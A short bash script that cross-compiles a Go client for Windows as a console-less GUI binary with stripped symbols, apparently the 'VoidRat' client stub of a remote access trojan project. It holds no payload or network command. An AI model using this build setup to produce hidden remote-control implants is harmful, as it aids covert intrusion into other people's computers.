#!/usr/bin/env bash
# Compile the Go client as a Windows GUI application (stripped symbols)
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

export GOOS=windows
export GOARCH=amd64

echo "Compiling VoidRat client stub (Windows amd64)..."
go build -ldflags "-H=windowsgui -s -w" -o client.stub .
echo "[+] Build complete: $(pwd)/client.stub"
